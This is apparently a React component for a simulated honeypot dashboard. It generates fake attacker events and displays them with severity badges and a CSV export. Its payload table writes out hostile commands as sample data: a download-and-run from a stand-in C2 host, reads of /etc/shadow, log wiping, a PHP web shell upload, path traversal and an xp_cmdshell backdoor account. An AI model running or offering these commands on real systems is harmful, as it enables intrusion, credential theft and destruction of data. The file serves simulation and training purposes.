import { useEffect, useRef, useState, useCallback } from "react";
import { Shield, Bug, Terminal, Activity, Globe, Clock, Zap, AlertTriangle, Trash2, Download } from "lucide-react";
import { supabase } from "@/lib/supabase";
import { Panel, Badge, MetricCard } from "@/components/ui";

interface HoneypotAttack {
  id: string;
  timestamp: string;
  attacker_ip: string;
  port: number;
  service: string;
  command: string;
  payload: string;
  severity: "low" | "medium" | "high" | "critical";
  status: "blocked" | "logged" | "contained";
}

const SERVICES = [
  { name: "SSH (22)", port: 22, protocol: "ssh" },
  { name: "Telnet (23)", port: 23, protocol: "telnet" },
  { name: "HTTP (80)", port: 80, protocol: "http" },
  { name: "FTP (21)", port: 21, protocol: "ftp" },
  { name: "RDP (3389)", port: 3389, protocol: "rdp" },
  { name: "MSSQL (1433)", port: 1433, protocol: "mssql" },
];

const ATTACKER_IPS = ["185.220.101.45", "45.133.1.22", "92.118.170.55", "193.32.162.175", "5.188.206.14"];
const USERNAMES = ["root", "admin", "administrator", "svc-backup", "sa", "postgres", "ubuntu", "oracle"];
const PASSWORDS = ["123456", "password", "admin", "P@ssw0rd", "root", "toor", "letmein", "qwerty"];

const PAYLOADS: Record<string, { cmd: string; payload: string; severity: HoneypotAttack["severity"] }[]> = {
  ssh: [
    { cmd: "ssh root@honeypot", payload: "cat /etc/passwd", severity: "high" },
    { cmd: "ssh root@honeypot", payload: "wget http://c2.example.com/shell.sh -O /tmp/sh; chmod +x /tmp/sh; /tmp/sh", severity: "critical" },
    { cmd: "ssh admin@honeypot", payload: "nmap -sS 10.0.0.0/24", severity: "medium" },
    { cmd: "ssh root@honeypot", payload: "history -c && rm -rf /var/log/*", severity: "high" },
    { cmd: "ssh postgres@honeypot", payload: "psql -c \"COPY (SELECT *) FROM users TO '/tmp/dump.csv'\"", severity: "high" },
  ],
  telnet: [
    { cmd: "telnet honeypot", payload: "enable\nconfigure terminal\nusername admin privilege 15 secret P@ssw0rd", severity: "critical" },
    { cmd: "telnet honeypot", payload: "show running-config", severity: "medium" },
  ],
  http: [
    { cmd: "GET /admin", payload: "GET /admin/?page=../../etc/passwd HTTP/1.1", severity: "high" },
    { cmd: "GET /.env", payload: "GET /.env HTTP/1.1", severity: "high" },
    { cmd: "POST /api/upload", payload: "POST /api/upload HTTP/1.1\\nContent: <?php system($_GET['cmd']); ?>", severity: "critical" },
    { cmd: "GET /wp-login.php", payload: "POST /wp-login.php HTTP/1.1\\nlog=admin&pwd=admin123", severity: "medium" },
  ],
  ftp: [
    { cmd: "ftp honeypot", payload: "RETR /etc/shadow", severity: "critical" },
    { cmd: "ftp honeypot", payload: "STOR /var/www/html/shell.php", severity: "critical" },
    { cmd: "ftp honeypot", payload: "LIST -la", severity: "low" },
  ],
  rdp: [
    { cmd: "rdp honeypot:3389", payload: "NLA bypass attempt - credssp", severity: "high" },
    { cmd: "rdp honeypot:3389", payload: "BlueKeep exploit (CVE-2019-0701) packet", severity: "critical" },
  ],
  mssql: [
    { cmd: "mssql-cli -S honeypot", payload: "EXEC xp_cmdshell 'net user backdoor P@ssw0rd /add'", severity: "critical" },
    { cmd: "mssql-cli -S honeypot", payload: "EXEC xp_cmdshell 'whoami'", severity: "high" },
  ],
};

function randomItem<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)]; }

function generateAttack(): HoneypotAttack {
  const svc = randomItem(SERVICES);
  const payloads = PAYLOADS[svc.protocol] ?? PAYLOADS.ssh;
  const p = randomItem(payloads);
  const ip = randomItem(ATTACKER_IPS);
  const user = randomItem(USERNAMES);
  const pass = randomItem(PASSWORDS);
  const cmdLine = p.cmd.includes("ssh") || p.cmd.includes("telnet") || p.cmd.includes("ftp")
    ? `${p.cmd} (user=${user}, pass=${pass})`
    : p.cmd;
  return {
    id: `HP-${Date.now()}-${Math.floor(Math.random() * 9999)}`,
    timestamp: new Date().toISOString(),
    attacker_ip: ip,
    port: svc.port,
    service: svc.name,
    command: cmdLine,
    payload: p.payload,
    severity: p.severity,
    status: p.severity === "critical" ? "contained" : p.severity === "high" ? "blocked" : "logged",
  };
}

export default function HoneypotPage() {
  const [active, setActive] = useState(false);
  const [attacks, setAttacks] = useState<HoneypotAttack[]>([]);
  const [selectedSvc, setSelectedSvc] = useState<string[]>(SERVICES.map((s) => s.name));
  const [stats, setStats] = useState({ total: 0, blocked: 0, contained: 0, uniqueIps: 0 });
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const termRef = useRef<HTMLDivElement>(null);

  const logToTerminal = useCallback((line: string) => {
    setTerminalLines((prev) => {
      const next = [...prev, line];
      return next.slice(-100);
    });
  }, []);

  const handleAttack = useCallback(() => {
    const attack = generateAttack();
    if (!selectedSvc.includes(attack.service)) return;
    setAttacks((prev) => [attack, ...prev].slice(0, 200));
    setStats((prev) => {
      const ips = new Set([...attacks.map((a) => a.attacker_ip), attack.attacker_ip]);
      return {
        total: prev.total + 1,
        blocked: prev.blocked + (attack.status === "blocked" ? 1 : 0),
        contained: prev.contained + (attack.status === "contained" ? 1 : 0),
        uniqueIps: ips.size,
      };
    });
    const sevIcon = attack.severity === "critical" ? "[!]" : attack.severity === "high" ? "[!]" : "[*]";
    logToTerminal(`${new Date(attack.timestamp).toLocaleTimeString()} ${sevIcon} ${attack.attacker_ip} → :${attack.port} ${attack.service} | ${attack.payload.substring(0, 80)}`);
  }, [selectedSvc, attacks, logToTerminal]);

  const toggle = () => {
    if (active) {
      if (intervalRef.current) clearInterval(intervalRef.current);
      intervalRef.current = null;
      setActive(false);
      logToTerminal("[*] Honeypot engine stopped. Stopping capture...");
    } else {
      setActive(true);
      logToTerminal("[*] Honeypot engine started. Listening on ports: " + selectedSvc.map((s) => s.match(/\d+/)?.[0]).join(", "));
      logToTerminal("[*] Simulated services online. Awaiting connections...");
      intervalRef.current = setInterval(handleAttack, 1500 + Math.random() * 2500);
    }
  };

  useEffect(() => {
    return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
  }, []);

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [terminalLines]);

  const toggleService = (name: string) => {
    setSelectedSvc((prev) => prev.includes(name) ? prev.filter((s) => s !== name) : [...prev, name]);
  };

  const clearAttacks = () => {
    setAttacks([]);
    setStats({ total: 0, blocked: 0, contained: 0, uniqueIps: 0 });
    setTerminalLines([]);
  };

  const exportLogs = () => {
    const data = attacks.map((a) => `${a.timestamp},${a.attacker_ip},${a.port},${a.service},"${a.payload.replace(/"/g, '""')}",${a.severity},${a.status}`).join("\n");
    const blob = new Blob(["timestamp,ip,port,service,payload,severity,status\n" + data], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "honeypot-attacks.csv";
    link.click();
    URL.revokeObjectURL(url);
  };

  const sevTone = (s: string) => s === "critical" ? "threat" : s === "high" ? "threat" : s === "medium" ? "warning" : "cyber";
  const statusTone = (s: string) => s === "contained" ? "threat" : s === "blocked" ? "warning" : "success";

  return (
    <div className="space-y-6">
      <header className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <div className="flex items-center gap-2">
            <Bug className="h-6 w-6 text-cyan-400" />
            <h1 className="text-2xl font-bold text-white tracking-tight">Interactive Honeypot</h1>
          </div>
          <p className="text-sm text-slate-400 mt-1">Simulated deception services that capture attacker behavior, payloads, and IOCs in real-time</p>
        </div>
        <div className="flex gap-2">
          <button onClick={toggle} className={`rounded-lg px-5 py-2 text-sm font-semibold flex items-center gap-2 transition-all ${active ? "bg-red-500/20 border border-red-500/40 text-red-300" : "btn-cyber"}`}>
            <Zap className={`h-4 w-4 ${active ? "animate-pulse" : ""}`} /> {active ? "Stop Honeypot" : "Start Honeypot"}
          </button>
          <button onClick={exportLogs} disabled={attacks.length === 0} className="rounded-lg px-4 py-2 text-sm flex items-center gap-2 border border-slate-600 text-slate-300 hover:bg-slate-700/30 disabled:opacity-40">
            <Download className="h-4 w-4" /> Export
          </button>
          <button onClick={clearAttacks} disabled={attacks.length === 0} className="rounded-lg px-4 py-2 text-sm flex items-center gap-2 border border-slate-600 text-slate-300 hover:bg-slate-700/30 disabled:opacity-40">
            <Trash2 className="h-4 w-4" /> Clear
          </button>
        </div>
      </header>

      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <MetricCard label="Total Attacks" value={stats.total} tone="cyber" icon={<Activity className="h-4 w-4" />} />
        <MetricCard label="Blocked" value={stats.blocked} tone="warning" icon={<Shield className="h-4 w-4" />} />
        <MetricCard label="Contained" value={stats.contained} tone="threat" icon={<AlertTriangle className="h-4 w-4" />} />
        <MetricCard label="Unique IPs" value={stats.uniqueIps} tone="success" icon={<Globe className="h-4 w-4" />} />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        {/* Service config */}
        <Panel title="Deception Services" icon={<Shield className="h-4 w-4 text-cyan-400" />}>
          <div className="space-y-2">
            {SERVICES.map((s) => (
              <label key={s.name} className="flex items-center gap-3 glass rounded-lg p-3 cursor-pointer hover:bg-slate-700/20">
                <input
                  type="checkbox"
                  checked={selectedSvc.includes(s.name)}
                  onChange={() => toggleService(s.name)}
                  className="h-4 w-4 rounded accent-cyan-500"
                />
                <div className="flex-1">
                  <div className="text-sm text-slate-200 font-medium">{s.name}</div>
                  <div className="text-[10px] text-slate-500">{s.protocol.toUpperCase()} protocol emulation</div>
                </div>
                <span className={`h-2 w-2 rounded-full ${active && selectedSvc.includes(s.name) ? "bg-emerald-400 animate-pulse" : "bg-slate-600"}`} />
              </label>
            ))}
          </div>
          <div className="mt-4 glass rounded-lg p-3 text-xs text-slate-400">
            <div className="flex items-center gap-1.5 mb-1 text-cyan-400">
              <Clock className="h-3 w-3" /> Attack interval: 1.5–4s
            </div>
            All interactions are simulated. No real network services are exposed.
          </div>
        </Panel>

        {/* Terminal */}
        <Panel title="Live Attack Terminal" icon={<Terminal className="h-4 w-4 text-emerald-400" />} className="lg:col-span-1">
          <div ref={termRef} className="h-[400px] overflow-y-auto bg-[#050810] rounded-lg p-3 font-mono text-xs space-y-0.5">
            {terminalLines.length === 0 ? (
              <div className="text-slate-600 italic">Start the honeypot to see live attack captures...</div>
            ) : (
              terminalLines.map((line, i) => (
                <div key={i} className={line.includes("[!]") ? "text-red-400" : line.includes("[*]") ? "text-cyan-400" : "text-slate-300"}>
                  {line}
                </div>
              ))
            )}
          </div>
        </Panel>

        {/* Attack feed */}
        <Panel title="Attack Feed" icon={<Bug className="h-4 w-4 text-red-400" />} className="lg:col-span-1">
          <div className="h-[400px] overflow-y-auto space-y-2">
            {attacks.length === 0 ? (
              <div className="text-slate-600 italic text-sm text-center mt-8">No attacks captured yet.</div>
            ) : (
              attacks.map((a) => (
                <div key={a.id} className="glass rounded-lg p-3 border border-slate-700/40">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-xs font-mono text-cyan-300">{a.attacker_ip}:{a.port}</span>
                    <div className="flex gap-1">
                      <Badge tone={sevTone(a.severity)}>{a.severity}</Badge>
                      <Badge tone={statusTone(a.status)}>{a.status}</Badge>
                    </div>
                  </div>
                  <div className="text-[10px] text-slate-500">{a.service} · {new Date(a.timestamp).toLocaleTimeString()}</div>
                  <div className="text-xs text-slate-300 font-mono mt-1 break-all">{a.payload.substring(0, 100)}</div>
                </div>
              ))
            )}
          </div>
        </Panel>
      </div>

      {/* Attack table */}
      {attacks.length > 0 && (
        <Panel title="Captured Attack Details" icon={<Activity className="h-4 w-4 text-cyan-400" />}>
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead>
                <tr className="text-[10px] uppercase text-slate-500 border-b border-slate-700/40">
                  <th className="text-left py-2 px-2">Time</th>
                  <th className="text-left py-2 px-2">Attacker IP</th>
                  <th className="text-left py-2 px-2">Port</th>
                  <th className="text-left py-2 px-2">Service</th>
                  <th className="text-left py-2 px-2">Payload</th>
                  <th className="text-left py-2 px-2">Severity</th>
                  <th className="text-left py-2 px-2">Status</th>
                </tr>
              </thead>
              <tbody>
                {attacks.slice(0, 50).map((a) => (
                  <tr key={a.id} className="border-b border-slate-700/20 hover:bg-slate-700/10">
                    <td className="py-2 px-2 text-slate-400 font-mono">{new Date(a.timestamp).toLocaleTimeString()}</td>
                    <td className="py-2 px-2 text-cyan-300 font-mono">{a.attacker_ip}</td>
                    <td className="py-2 px-2 text-slate-300">{a.port}</td>
                    <td className="py-2 px-2 text-slate-300">{a.service}</td>
                    <td className="py-2 px-2 text-slate-400 font-mono text-[10px] max-w-xs truncate">{a.payload}</td>
                    <td className="py-2 px-2"><Badge tone={sevTone(a.severity)}>{a.severity}</Badge></td>
                    <td className="py-2 px-2"><Badge tone={statusTone(a.status)}>{a.status}</Badge></td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </Panel>
      )}
    </div>
  );
}
